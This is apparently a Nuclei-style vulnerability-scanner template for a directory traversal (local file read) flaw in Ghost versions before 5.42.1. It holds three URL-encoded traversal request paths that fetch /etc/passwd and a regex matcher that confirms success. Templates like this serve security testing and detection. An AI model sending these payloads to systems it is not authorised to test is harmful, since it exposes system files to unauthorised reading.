http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/assets/built%2F..%2F..%2F..%2F..%2F..%2F/etc/passwd'
  - '{{BaseURL}}/assets/built%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd'
  - '{{BaseURL}}/%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd'
  stop-at-first-match: true
id: ghost-lfi
info:
  author: reewardius
  description: Ghost before 5.42.1 allows to read arbitrary files within the active
    theme's folder via /assets/built%2F..%2F..%2F/ directory traversal
  name: Ghost Local File Inclusion
  severity: high
  tags: lfi,lfr,generic
